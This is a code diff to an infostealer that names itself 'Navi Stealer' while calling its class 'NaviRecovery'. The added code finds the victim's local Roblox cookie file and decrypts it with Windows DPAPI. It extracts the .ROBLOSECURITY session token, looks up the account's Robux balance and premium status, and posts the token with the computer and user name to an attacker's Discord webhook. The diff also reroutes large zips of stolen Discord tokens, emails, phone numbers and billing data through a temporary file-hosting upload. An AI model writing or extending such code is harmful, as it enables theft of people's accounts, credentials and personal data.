@@ -1,11 +1,15 @@
 import os, sys, json, re, shutil, sqlite3, zipfile, subprocess, threading, platform, base64, socket, uuid, ctypes, traceback
 from datetime import datetime, timezone
-
-# Ensure requests is installed
-try: import requests
-except:
+try: 
+    import requests
+except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
     import requests
+try: 
+    import win32crypt
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "-q"])
+    import win32crypt
 
 # CONFIG
 _SET = {
@@ -18,6 +22,123 @@ _SET = {
     "secure": False,
     "ping": False
 }
+
+
+def fetch_roblox_sex(cookie):
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+    try:
+        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
+        if user_res.status_code != 200:
+            return None
+        user_data = user_res.json()
+        user_id = user_data["id"]
+        username = user_data["name"]
+        display_name = user_data.get("displayName", "N/A")
+        robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10)
+        robux = robux_res.json().get("robux", 0) if robux_res.status_code == 200 else 0
+        prem_res = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers=headers, timeout=10)
+        is_premium = prem_res.json() if prem_res.status_code == 200 else False
+        thumb_res = requests.get(
+            f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png",
+            headers=headers, timeout=10
+        )
+        avatar_url = ""
+        if thumb_res.status_code == 200:
+            thumb_data = thumb_res.json()
+            if thumb_data.get("data"):
+                avatar_url = thumb_data["data"][0].get("imageUrl", "")
+        return {
+            "id": user_id,
+            "name": username,
+            "display_name": display_name,
+            "robux": robux,
+            "premium": is_premium,
+            "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
+            "avatar_url": avatar_url
+        }
+    except Exception:
+        return None
+
+def roblox_sex():
+    user_profile = os.getenv("USERPROFILE", "")
+    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+    if not os.path.exists(roblox_cookies_path):
+        print("[!] Roblox cookie file not found.")
+        return
+    temp_dir = os.getenv("TEMP", "")
+    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
+    shutil.copy(roblox_cookies_path, destination_path)
+    decrypted_cookie = None
+    try:
+        with open(destination_path, 'r', encoding='utf-8') as file:
+            try:
+                file_content = json.load(file)
+                encoded_cookies = file_content.get("CookiesData", "")
+                if encoded_cookies:
+                    decoded_cookies = base64.b64decode(encoded_cookies)
+                    try:
+                        decrypted_bytes = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+                        decrypted_cookie = decrypted_bytes.decode('utf-8', errors='ignore')
+                        print("[+] Decryption successful.")
+                    except Exception as e:
+                        print(f"[!]")
+                else:
+                    print("[!]")
+            except json.JSONDecodeError as e:
+                print(f"[!]")
+    except Exception as e:
+        print(f"[!]")
+    finally:
+        if os.path.exists(destination_path):
+            try:
+                os.remove(destination_path)
+            except Exception:
+                pass
+
+    if decrypted_cookie:
+        match = re.search(r'(_\|WARNING:.*?);', decrypted_cookie)
+        if match:
+            token = match.group(1)
+            info = fetch_roblox_sex(token)
+            if info:
+                color = 0x00A3FF
+                fields = [
+                    {"name": "Username:", "value": f"[{info['name']}]({info['profile_url']})", "inline": True},
+                    {"name": "Display Name:", "value": info["display_name"], "inline": True},
+                    {"name": "User ID:", "value": str(info["id"]), "inline": True},
+                    {"name": "<:7116_Robux:1509632493106499624> Robux:", "value": f"{info['robux']} R$", "inline": True},
+                    {"name": "<:2978robloxlogo:1509632404665401506> Premium:", "value": "✅ Yes" if info["premium"] else "❌ No", "inline": True},
+                    {"name": "Target PC:", "value": f"{os.getenv('COMPUTERNAME')}\\{os.getenv('USERNAME')}", "inline": True}
+                ]
+                chunk_size = 1000
+                if len(token) > chunk_size:
+                    chunks = [token[i:i+chunk_size] for i in range(0, len(token), chunk_size)]
+                    for idx, chunk in enumerate(chunks):
+                        fields.append({"name": f"Token Part {idx+1}/{len(chunks)}", "value": f"```\n{chunk}\n```", "inline": False})
+                else:
+                    fields.append({"name": "Token", "value": f"```\n{token}\n```", "inline": False})
+                gh = "https://github.com/glockinhand"
+                payload = {
+                    "embeds": [{
+                        "username": "Navi Stealer",
+                        "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png",
+                        "title": "<:2978robloxlogo:1509632404665401506> Roblox Account Captured",
+                        "color": color,
+                        "thumbnail": {"url": info["avatar_url"]},
+                        "fields": fields,
+                        "footer": {"text": f"Navi Multitool | {gh}"}
+                    }]
+                }
+                try:
+                    requests.post(_SET["hook"], json=payload, timeout=10)
+                except Exception as e:
+                    print(f"[!]")
+            else:
+                print("[!]")
+        else:
+            print("[!]")
+    else:
+        print("[!]")
 
 class NaviRecovery:
     def __init__(self):
@@ -437,25 +558,28 @@ class NaviRecovery:
                 pic = userjson.get("avatar")
                 uid = userjson.get("id")
                 pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pic}" if pic is not None else "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
-                _embeds.append({"title": f"<a:12705eyes:1505917648507109508> Token Info: {t['u']}", "color": 0x00A3FF, "thumbnail": {"url": pfp}, "fields": [{"name": ":id: ID", "value": f"`{t['id']}`", "inline": True}, {"name": "<a:Invite9:1505916245445312592> Email", "value": f"`{t['e']}`", "inline": True}, {"name": "📱 Phone", "value": f"`{t['p']}`", "inline": True}, {"name": "<a:50534diamond:1505916198850658376> Nitro", "value": t['n'], "inline": False}, {"name": "<a:Ver_money83:1505916176776171591> Billing", "value": t['b'], "inline": False}, {"name": "<a:Rocket:1505916279477768203> Token", "value": f"``` {t['t']} ```", "inline": False}]})
-            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Navi Recovery", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
+                _embeds.append({"title": f"<a:12705eyes:1505917648507109508> Token Info: {t['u']}", "color": 0x00A3FF, "thumbnail": {"url": pfp}, "fields": [{"name": ":id: ID:", "value": f"`{t['id']}`", "inline": True}, {"name": "<a:Invite9:1505916245445312592> Email:", "value": f"`{t['e']}`", "inline": True}, {"name": "📱 Phone:", "value": f"`{t['p']}`", "inline": True}, {"name": "<a:50534diamond:1505916198850658376> Nitro:", "value": t['n'], "inline": False}, {"name": "<a:Ver_money83:1505916176776171591> Billing:", "value": t['b'], "inline": False}, {"name": "<a:Rocket:1505916279477768203> Token:", "value": f"``` {t['t']} ```", "inline": False}]})
+            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Navi Stealer", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
             
             if os.path.getsize(_zp) > 8 * 1024 * 1024:
                 try:
                     with open(_zp, "rb") as f:
                         r = requests.post(
-                            "https://litterbox.catbox.moe/resources/internals/api.php",
-                            data={"reqtype": "fileupload", "time": "72h"},
-                            files={"fileToUpload": (_zn, f)},
+                            "https://tmpfiles.org/api/v1/upload",
+                            files={"file": f},
                             timeout=120
                         )
                     if r.status_code == 200:
-                        _url = r.text.strip()
-                        print(f"[ZIP UPLOAD] Success: {_url}")
-                        _main_emb["description"] = f"⚠️ **ZIP too large!** Download here: [Click Me]({_url})"
-                        requests.post(_SET["hook"], json=_pj)
+                        _data = r.json()
+                        if _data.get("status") == "success":
+                            _url = _data["data"]["url"].replace("tmpfiles.org/", "tmpfiles.org/dl/")
+                            print(f"[ZIP UPLOAD] Success: {_url}")
+                            _main_emb["description"] = f"⚠️ **ZIP too large!** Download here: [Click Me]({_url})"
+                            requests.post(_SET["hook"], json=_pj)
+                        else:
+                            print(f"[ZIP UPLOAD] API Error: {r.text[:200]}")
                     else:
-                        print(f"[ZIP UPLOAD] Failed — response: {r.text[:200]}")
+                        print(f"[ZIP UPLOAD] Failed — response: {r.status_code} - {r.text[:200]}")
                 except Exception as e:
                     print(f"[ZIP UPLOAD] Exception: {e}")
 
@@ -468,7 +592,6 @@ class NaviRecovery:
                             files={"file": f},
                             timeout=30
                         )
-
 
                     print(f"[UPLOAD] {r.status_code}")
                     print(r.text)
@@ -496,4 +619,5 @@ class NaviRecovery:
 if __name__ == "__main__":
     try:
         NaviRecovery().run()
+        roblox_sex()
     except: pass
